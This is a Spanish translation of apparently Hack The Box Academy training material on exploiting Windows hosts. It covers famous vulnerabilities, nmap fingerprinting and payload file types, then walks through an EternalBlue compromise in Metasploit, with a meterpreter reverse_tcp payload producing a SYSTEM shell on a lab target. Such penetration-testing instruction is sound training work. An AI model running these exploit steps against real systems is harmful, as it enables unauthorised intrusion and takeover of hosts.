Desde que muchos de nosotros podemos recordar, Microsoft ha dominado los mercados de computación doméstica y empresarial. En la actualidad, con la introducción de características mejoradas de Active Directory, mayor interconectividad con servicios en la nube, Windows Subsystem for Linux y mucho más, la superficie de ataque de Microsoft también ha crecido.

Por ejemplo, solo en los últimos cinco años, se han reportado `3688` vulnerabilidades solo en productos de Microsoft, y este número crece diariamente. Esta tabla se derivó de [AQUÍ](https://www.cvedetails.com/vendor/26/Microsoft.html)

---
### Windows Vulnerability Table

![image](https://academy.hackthebox.com/storage/modules/115/window-vulns-table.png)

## Prominent Windows Exploits

En los últimos años, varias vulnerabilidades en el sistema operativo Windows y sus ataques correspondientes son algunas de las vulnerabilidades más explotadas de nuestro tiempo. Discutamos algunas de ellas por un minuto:

| **Vulnerability** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MS08-067`        | MS08-067 fue un parche crítico desplegado en muchas revisiones de Windows debido a una falla en SMB. Esta falla hacía extremadamente fácil infiltrarse en un host Windows. Era tan eficiente que el gusano Conficker la utilizaba para infectar cada host vulnerable que encontraba. Incluso Stuxnet aprovechó esta vulnerabilidad.                                                                                                                                                                                      |
| `Eternal Blue`    | MS17-010 es un exploit filtrado en la fuga de Shadow Brokers del NSA. Este exploit fue utilizado notablemente en los ataques de ransomware WannaCry y NotPetya. Este ataque aprovechó una falla en el protocolo SMB v1 que permitía la ejecución de código. Se cree que EternalBlue infectó a más de 200,000 hosts solo en 2017 y sigue siendo una forma común de encontrar acceso a un host Windows vulnerable.                                                                                                |
| `PrintNightmare`  | Una vulnerabilidad de ejecución remota de código en el Windows Print Spooler. Con credenciales válidas para ese host o una shell de bajo privilegio, puedes instalar una impresora, agregar un controlador que se ejecute para ti y te otorgue acceso a nivel de sistema al host. Esta vulnerabilidad ha estado devastando compañías durante 2021. 0xdf escribió un excelente post sobre ello [aquí](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).                                                                                          |
| `BlueKeep`        | CVE 2019-0708 es una vulnerabilidad en el protocolo RDP de Microsoft que permite la ejecución remota de código. Esta vulnerabilidad aprovechó un canal mal llamado para obtener la ejecución de código, afectando a todas las revisiones de Windows desde Windows 2000 hasta Server 2008 R2.                                                                                                                                                                                                                                                     |
| `Sigred`          | CVE 2020-1350 utilizó una falla en la forma en que DNS lee los registros de recursos SIG. Es un poco más complicado que los otros exploits en esta lista, pero si se hace correctamente, le dará al atacante privilegios de administrador de dominio ya que afectará al servidor DNS del dominio, que comúnmente es el controlador de dominio principal.                                                                                                                                                                                                   |
| `SeriousSam`      | CVE 2021-36924 explota un problema con la forma en que Windows maneja los permisos en la carpeta `C:\Windows\system32\config`. Antes de solucionar el problema, los usuarios sin elevación tenían acceso a la base de datos SAM, entre otros archivos. Esto no es un gran problema ya que los archivos no pueden ser accedidos mientras están en uso por la PC, pero esto se vuelve peligroso al mirar las copias de seguridad de las sombras de volumen. Estos mismos errores de privilegio existen en los archivos de respaldo, permitiendo a un atacante leer la base de datos SAM, volcando credenciales. |
| `Zerologon`       | CVE 2020-1472 es una vulnerabilidad crítica que explota una falla criptográfica en el Microsoft Active Directory Netlogon Remote Protocol (MS-NRPC). Permite a los usuarios iniciar sesión en servidores usando NT LAN Manager (NTLM) e incluso enviar cambios de cuenta a través del protocolo. El ataque puede ser un poco complejo, pero es trivial de ejecutar ya que un atacante tendría que hacer alrededor de 256 intentos de adivinar la contraseña de la cuenta de la computadora antes de encontrar lo que necesita. Esto puede suceder en cuestión de segundos.              |
|                   |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |

Con estas vulnerabilidades en mente, Windows no va a desaparecer. Necesitamos ser proficientes en identificar vulnerabilidades, explotarlas y movernos en hosts y entornos Windows. Una comprensión de estos conceptos puede ayudarnos a asegurar nuestros entornos contra ataques. Ahora es el momento de sumergirse y explorar algunas diversiones de explotación centradas en Windows.

---
## Enumerating Windows & Fingerprinting Methods

Este módulo asume que ya has realizado tu fase de enumeración de hosts y entiendes qué servicios se ven comúnmente en los hosts. Solo intentamos darte algunos trucos rápidos para determinar si un host es probablemente una máquina Windows. Consulta el módulo [Network Enumeration With NMAP](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap) para una mirada más detallada a la enumeración de hosts y la toma de huellas digitales.

Dado que tenemos un conjunto de objetivos, `¿cuáles son algunas formas de determinar si el host es probablemente una máquina Windows?` Para responder a esta pregunta, podemos mirar algunas cosas. La primera es el `Time To Live` (TTL) al utilizar ICMP para determinar si el host está activo. Una respuesta típica de un host Windows será 32 o 128. Una respuesta de 128 es la respuesta más común que verás. Este valor puede no ser siempre exacto, especialmente si no estás en la misma red de capa tres que el objetivo. Podemos utilizar este valor ya que la mayoría de los hosts nunca estarán a más de 20 saltos de tu punto de origen, por lo que hay pocas posibilidades de que el contador TTL caiga en los valores aceptables de otro tipo de sistema operativo. En la salida de ping `a continuación`, podemos ver un ejemplo de esto. Para el ejemplo, hicimos ping a un host Windows 10 y podemos ver que hemos recibido respuestas con un TTL de 128. Consulta este [enlace](https://subinsb.com/default-device-ttl-values/) para una buena tabla que muestra otros valores de TTL por sistema operativo.

### Pinged Host

```r
ping 192.168.86.39 

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
```

Otra forma en que podemos validar si el host es Windows o no es utilizar nuestra herramienta práctica, `NMAP`. Nmap tiene una capacidad genial incorporada para ayudar con la identificación del sistema operativo y muchos otros escaneos con guiones para verificar cualquier cosa, desde una vulnerabilidad específica hasta información recopilada de SNMP. Para este ejemplo, utilizaremos la opción `-O` con salida detallada `-v` para iniciar un escaneo de identificación del sistema operativo contra nuestro objetivo `192.168.86.39`. A medida que avanzamos en la sesión de shell a continuación y miramos los resultados, algunas cosas revelan que este es un host Windows. Nos enfocaremos en esos detalles en un minuto. Mira cuidadosamente en la parte inferior de la sesión de shell. Podemos ver el punto etiquetado `OS CPE: cpe:/o:microsoft:windows_10` y `OS details: Microsoft Windows 10 1709 - 1909`. Nmap hizo esta suposición basada en varias métricas diferentes que deriva de la pila TCP/IP. Utiliza esas cualidades para determinar el sistema operativo mientras lo verifica contra una base de datos de huellas digitales de sistemas operativos. En este caso, Nmap ha determinado que nuestro host es una máquina Windows 10 con un nivel de revisión entre 1709 y 1909.

Si encuentras problemas y los escaneos no arrojan muchos resultados, intenta nuevamente con las opciones `-A` y `-Pn`. Esto realizará un escaneo diferente y puede funcionar. Para más información sobre cómo funciona este proceso, consulta este artículo de la [Nmap Documentation](https://nmap.org/book/man-os-detection.html). Ten cuidado con este método de detección. Implementar un firewall u otras características de seguridad puede oscurecer el host o estropear los resultados. Cuando sea posible, usa más de una verificación para tomar una determinación.

### OS Detection Scan

```r
sudo nmap -v -O 192.168.86.39

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT
Initiating ARP Ping Scan at 17:40
Scanning 192.168.86.39 [1 port]
Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:40
Completed

 Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed
Initiating SYN Stealth Scan at 17:40
Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)
Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39)
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.010s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
```

Ahora que sabemos que estamos tratando con un host Windows 10, necesitamos enumerar los servicios que podemos ver para determinar si tenemos una posible vía de explotación. Para realizar el banner grabbing, podemos usar varias herramientas diferentes. Netcat, Nmap y muchas otras pueden realizar la enumeración que necesitamos, pero para este caso, veremos un simple script de Nmap llamado `banner.nse`. Para cada puerto que Nmap vea como activo, intentará conectarse al puerto y obtener cualquier información que pueda de él. En la sesión a continuación, Nmap intentó conectarse a cada puerto, pero los únicos puertos que dieron una respuesta fueron los puertos 902 y 912. Basado en el banner de la página, tienen algo que ver con VMWare Workstation. Podemos intentar encontrar un exploit relacionado con ese protocolo, o podemos seguir enumerando los otros puertos. En un pentest real, querrás ser lo más minucioso posible, asegurándote de tener una visión completa del entorno.

### Banner Grab to Enumerate Ports

```r
sudo nmap -v 192.168.86.39 --script banner.nse

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
NSE: Loaded 1 scripts for scanning.
<snip>
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)
NSE: Script scanning 192.168.86.39.
Initiating NSE at 18:01
Completed NSE at 18:01, 20.11s elapsed
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.012s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
```

Los ejemplos mostrados arriba son solo algunas formas de ayudar a tomar huellas digitales y determinar si un host es una máquina Windows. No es una lista exhaustiva, y hay muchas otras verificaciones que puedes hacer. Ahora que hemos discutido la toma de huellas digitales, veamos varios tipos de archivos y para qué se pueden usar al crear payloads.

---
## Bats, DLLs, & MSI Files, Oh My!

Cuando se trata de crear payloads para hosts Windows, tenemos muchas opciones para elegir. DLLs, archivos por lotes, paquetes MSI e incluso scripts de PowerShell son algunos de los métodos más comunes de usar. Cada tipo de archivo puede lograr diferentes cosas para nosotros, pero lo que todos tienen en común es que son ejecutables en un host. Trata de mantener tu mecanismo de entrega para el payload en mente, ya que esto puede determinar qué tipo de payload utilizas.

### Payload Types to Consider

- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) Un Dynamic Linking Library (DLL) es un archivo de biblioteca utilizado en sistemas operativos Microsoft para proporcionar código y datos compartidos que pueden ser utilizados por muchos programas diferentes a la vez. Estos archivos son modulares y nos permiten tener aplicaciones más dinámicas y fáciles de actualizar. Como pentester, inyectar un DLL malicioso o secuestrar una biblioteca vulnerable en el host puede elevar nuestros privilegios a SYSTEM y/o evitar los Controles de Cuenta de Usuario.
    
- [Batch](https://commandwindows.com/batch.htm) Los archivos batch son scripts DOS basados en texto utilizados por los administradores de sistemas para completar múltiples tareas a través del intérprete de comandos. Estos archivos terminan con una extensión `.bat`. Podemos usar archivos batch para ejecutar comandos en el host de manera automatizada. Por ejemplo, podemos tener un archivo batch que abra un puerto en el host o se conecte de vuelta a nuestra caja atacante. Una vez hecho esto, puede realizar pasos básicos de enumeración y enviarnos información de vuelta por el puerto abierto.
    
- [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript es un lenguaje de scripting ligero basado en el Visual Basic de Microsoft. Se utiliza típicamente como un lenguaje de scripting del lado del cliente en servidores web para habilitar páginas web dinámicas. VBS es anticuado y está deshabilitado por la mayoría de los navegadores web modernos, pero vive en el contexto de Phishing y otros ataques dirigidos a hacer que los usuarios realicen una acción como habilitar la carga de Macros en un documento de Excel o hacer clic en una celda para que el motor de scripting de Windows ejecute una pieza de código.
    
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) Los archivos `.MSI` sirven como una base de datos de instalación para el Instalador de Windows. Al intentar instalar una nueva aplicación, el instalador buscará el archivo .msi para entender todos los componentes requeridos y cómo encontrarlos. Podemos usar el Instalador de Windows creando un payload como un archivo .msi. Una vez que lo tengamos en el host, podemos ejecutar `msiexec` para ejecutar nuestro archivo, lo que nos proporcionará un acceso adicional, como una shell inversa con privilegios elevados.
    
- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell es tanto un entorno de shell como un lenguaje de scripting. Sirve como el entorno de shell moderno de Microsoft en sus sistemas operativos. Como lenguaje de scripting, es un lenguaje dinámico basado en el .NET Common Language Runtime que, al igual que su componente de shell, toma la entrada y salida como objetos .NET. PowerShell puede proporcionarnos una plétora de opciones cuando se trata de obtener una shell y ejecutar en un host, entre muchos otros pasos en nuestro proceso de pruebas de penetración.
    

Ahora que entendemos para qué se puede usar cada tipo de archivo de Windows, discutamos algunas herramientas, tácticas y procedimientos básicos para construir nuestros payloads y entregarlos al host para obtener una shell.

---

## Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

A continuación, encontrarás ejemplos de diferentes métodos de generación de payloads y formas de transferir nuestros payloads a la víctima. Hablaremos sobre algunos de estos métodos a un nivel alto, ya que nuestro enfoque está en la generación de payloads y las diferentes formas de adquirir una shell en el objetivo.

### Payload Generation

Tenemos muchas buenas opciones para tratar con la generación de payloads para usar contra hosts Windows. Tocamos algunos de estos ya en secciones anteriores. Por ejemplo, el Metasploit-Framework y MSFVenom son una forma muy práctica de generar payloads ya que

 es agnóstico al sistema operativo. La tabla a continuación presenta algunas de nuestras opciones. Sin embargo, esta no es una lista exhaustiva, y nuevos recursos salen diariamente.

| **Resource**                      | **Description**                                                                                                                                                                                                                                                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF es una herramienta extremadamente versátil para cualquier kit de herramientas de pentester. Sirve como una forma de enumerar hosts, generar payloads, utilizar exploits públicos y personalizados, y realizar acciones de post-explotación una vez en el host. Piénsalo como una navaja suiza. |
| `Payloads All The Things`         | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Aquí, puedes encontrar muchos recursos y hojas de referencia diferentes para la generación de payloads y la metodología general.                                                                                                                                        |
| `Mythic C2 Framework`             | [Source](https://github.com/its-a-feature/Mythic) El framework Mythic C2 es una opción alternativa a Metasploit como un Framework de Comando y Control y caja de herramientas para la generación de payloads únicos.                                                                                                                    |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishang es una colección de scripts y implantes ofensivos de PowerShell. Incluye muchas utilidades que pueden ser útiles para cualquier pentester.                                                                                                                  |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour es una herramienta para generar y utilizar binarios ofuscados para usar contra hosts Windows.                                                                                                                                                                    |

### Payload Transfer and Execution:

Además de los vectores de web-drive-by, correos electrónicos de phishing o dead drops, los hosts Windows pueden proporcionarnos varias otras vías de entrega de payloads. La lista a continuación incluye algunas herramientas y protocolos útiles para usar mientras intentamos soltar un payload en un objetivo.

- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) es un conjunto de herramientas construido en Python que nos proporciona una forma de interactuar directamente con los protocolos de red. Algunas de las herramientas más interesantes que nos importan en Impacket tratan con `psexec`, `smbclient`, `wmi`, Kerberos y la capacidad de establecer un servidor SMB.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): es un gran recurso para encontrar oneliners rápidos para ayudar a transferir archivos entre hosts de manera expedita.
- `SMB`: SMB puede proporcionar una ruta fácil de explotar para transferir archivos entre hosts. Esto puede ser especialmente útil cuando los hosts de la víctima están unidos a un dominio y utilizan comparticiones para alojar datos. Nosotros, como atacantes, podemos usar estas comparticiones de archivos SMB junto con C$ y admin$ para alojar y transferir nuestros payloads e incluso exfiltrar datos a través de los enlaces.
- `Remote execution via MSF`: Incorporado en muchos de los módulos de exploit en Metasploit hay una función que construirá, preparará y ejecutará los payloads automáticamente.
- `Other Protocols`: Al mirar un host, protocolos como FTP, TFTP, HTTP/S y más pueden proporcionarte una forma de cargar archivos en el host. Enumera y presta atención a las funciones que están abiertas y disponibles para su uso.

Ahora que sabemos qué herramientas, tácticas y procedimientos podemos usar para transferir nuestros payloads, revisemos un ejemplo del proceso de compromiso.

---
## Example Compromise Walkthrough

1. Enumerate The Host

Ping, Netcat, escaneos con Nmap e incluso Metasploit son buenas opciones para comenzar a enumerar a nuestras potenciales víctimas. Para comenzar esta vez, utilizaremos un escaneo con Nmap. La parte de enumeración de cualquier cadena de explotación es, sin duda, la pieza más crítica del rompecabezas. Entender el objetivo y qué lo hace funcionar aumentará tus posibilidades de obtener una shell.

### Enumerate the Host

```r
nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29

```

Descubrimos algunas cosas durante el escaneo y la validación del host de ejemplo en cuestión. Está ejecutando `Windows Server 2016 Standard 6.3`. Ahora tenemos el nombre del host y sabemos que no está en un dominio y está ejecutando varios servicios. Ahora que hemos recopilado algo de información, determinemos nuestra posible ruta de explotación. `IIS` podría ser una posible ruta, intentar acceder al host a través de SMB utilizando una herramienta como Impacket o autenticarse si tuviéramos credenciales podría hacerlo, y desde una perspectiva del sistema operativo, también podría haber una ruta para una RCE. MS17-010 (EternalBlue) se ha conocido por afectar a hosts que van desde Windows 2008 hasta Server 2016. Con esto en mente, podría ser una apuesta sólida que nuestra víctima sea vulnerable ya que cae en esa ventana. Validémoslo usando una verificación auxiliar incorporada de `Metasploit`, `auxiliary/scanner/smb/smb_ms17_010`.

2. Search for and decide on an exploit path

Abre `msfconsole` y busca EternalBlue, o puedes usar la cadena en la sesión a continuación para usar la verificación. Establece el campo RHOSTS con la dirección IP del objetivo e inicia el escaneo. Como se puede ver en las opciones del módulo, puedes completar más configuraciones de SMB, pero no es necesario. Ayudarán a que la verificación tenga más probabilidades de éxito. Cuando estés listo, escribe `run`.

### Determine an Exploit Path

```r
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                 Required  Description
   ----         ---------------                 --------  -----------
   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
                k/data/wordlists/named_pipes.t
                xt
   RHOSTS                                       yes       The target host(s),

 range CIDR identifier, or hosts f
                                                          ile with syntax 'file:<path>'
   RPORT        445                             yes       The SMB service port (TCP)
   SMBDomain    .                               no        The Windows domain to use for authentication
   SMBPass                                      no        The password for the specified username
   SMBUser                                      no        The username to authenticate as
   THREADS      1                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97

RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Ahora, podemos ver en los resultados de la verificación que nuestro objetivo es probablemente vulnerable a EternalBlue. Configuraremos el exploit y el payload ahora, y luego lo intentaremos.

3. Select Exploit & Payload, then Deliver

### Choose & Configure Our Exploit & Payload

```r
msf6 > search eternal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Para este caso, revisamos los módulos de exploit de MSF utilizando la función de búsqueda para buscar un exploit que coincidiera con EternalBlue. La lista anterior fue el resultado. Dado que he tenido más suerte con la versión `psexec` de este exploit, probaremos esa primero. Elijámosla y continuemos con la configuración.

### Configure The Exploit & Payload

```r
msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Asegúrate de configurar correctamente las opciones de tu payload antes de ejecutar el exploit. Cualquier opción que tenga `Required` configurado en sí será un espacio necesario para completar. En este caso, necesitamos asegurarnos de que nuestros campos `RHOSTS, LHOST y LPORT` estén configurados correctamente. Para este intento, aceptar los valores predeterminados para el resto está bien.

### Validate Our Options

```r
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                10.129.201.97                yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.12      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Esta vez, lo mantuvimos simple y solo usamos un `windows/meterpreter/reverse_tcp payload`. Puedes cambiar esto como desees para un tipo de shell diferente o para ofuscar más tu ataque, como se muestra en las secciones de payloads anteriores. Con nuestras opciones configuradas, intentémoslo y veamos si obtenemos una shell.

4. Execute Attack, and Receive A Callback.

### Execute Our Attack

```r
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Selecting PowerShell target
[*] 10.129.201.97:445 - Executing the payload...
[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

¡Éxito! Hemos logrado nuestro exploit y obtenido una sesión shell. Una shell de nivel `SYSTEM` además. Como se ve en los módulos anteriores de MSF, ahora que tenemos una sesión abierta a través de Meterpreter, se nos presenta el prompt `meterpreter >`. Desde aquí, podemos utilizar Meterpreter para ejecutar más comandos para recopilar información del sistema

, robar credenciales de usuario o utilizar otro módulo de post-explotación contra el host. Si deseas interactuar directamente con el host, también puedes pasar a una sesión shell interactiva en el host desde Meterpreter.

5. Identify the Native Shell.

### Identify Our Shell

```r
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Cuando ejecutamos el comando de Meterpreter `shell`, inició otro proceso en el host y nos dejó en una shell del sistema. ¿Puedes determinar en qué estamos basándonos en el prompt? Solo ver `C:\Windows\system32>` puede darnos una pista de que estamos en una shell de `cmd.exe`. Para asegurarnos, simplemente ejecuta el comando help dentro de la shell también te lo hará saber. Si estuviéramos en PowerShell, nuestro prompt se vería como `PS C:\Windows\system32>`. El PS delante nos dice que es una sesión de PowerShell. Felicidades por entrar en una shell en nuestro último host Windows explotado.

Ahora que hemos pasado por un proceso de compromiso de ejemplo, veamos las shells que puedes ver cuando aterrizas en el host.

---
## CMD-Prompt and Power[Shell]s for Fun and Profit.

Somos afortunados con los hosts Windows de tener no una, sino dos opciones de shells para utilizar por defecto. Ahora puedes preguntarte:

`¿Cuál es la correcta para usar?`

La respuesta es simple, la que te proporcione la capacidad que necesitas en el momento. Comparemos `cmd` y `PowerShell` por un minuto para tener una idea de lo que ofrecen y cuándo sería mejor elegir una sobre la otra.

